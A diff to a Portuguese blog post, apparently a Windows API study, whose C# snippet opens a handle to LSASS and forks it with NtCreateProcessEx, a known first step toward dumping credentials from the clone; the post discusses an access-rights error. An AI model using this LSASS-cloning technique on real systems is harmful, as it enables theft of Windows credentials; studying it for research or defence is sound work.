@@ -18,34 +18,32 @@ Contextualizando: durante meus estudos de Windows API, estive aprofundando em t�
 No código, primeiro é aberto um handle pro LSASS com o acesso `PROCESS_CREATE_PROCESS²`. Como exibido na captura de tela acima, o erro ocorria na execução da API `NtCreateProcessEx³`. Esse erro ocorre devido a privilégios insuficientes dados ao handle.
 
 ```csharp
-	uint accessParentProcess = PROCESS_CREATE_PROCESS;
-	uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;
+uint accessParentProcess = PROCESS_CREATE_PROCESS;
+uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;
 
-	IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS
+IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid));
 
-	Console.WriteLine($"[+] Handle: {hParentProcess}");
+Console.WriteLine($"[+] Handle: {hParentProcess}");
 
-  // clonando o processo do LSASS
+int ningning = NtCreateProcessEx(
+	out IntPtr hChildProcess,
+	(uint)accessChildProcess,
+	IntPtr.Zero,
+	hParentProcess,
+	0,
+	IntPtr.Zero,
+	IntPtr.Zero,
+	IntPtr.Zero,
+	false
+);
 
-	int ningning = NtCreateProcessEx(
-		out IntPtr hChildProcess,
-		(uint)accessChildProcess,
-		IntPtr.Zero,
-		hParentProcess,
-		0,
-		IntPtr.Zero,
-		IntPtr.Zero,
-		IntPtr.Zero,
-		false
-	);
+if (ningning == 0)
+{
+	uint hChildPid = GetProcessId(hChildProcess);
 
-	if (ningning == 0)
-	{
-		uint hChildPid = GetProcessId(hChildProcess);
-
-		Console.WriteLine($"[^] Forked Handle: {hChildProcess}");
-		Console.WriteLine($"[^] Forked PID: {hChildPid}");
-	}
+	Console.WriteLine($"[^] Forked Handle: {hChildProcess}");
+	Console.WriteLine($"[^] Forked PID: {hChildPid}");
+}
 ```
 
 > `PROCESS_CREATE_PROCESS²`: permissão necessária criar uma fork (clone) de um processo alvo.
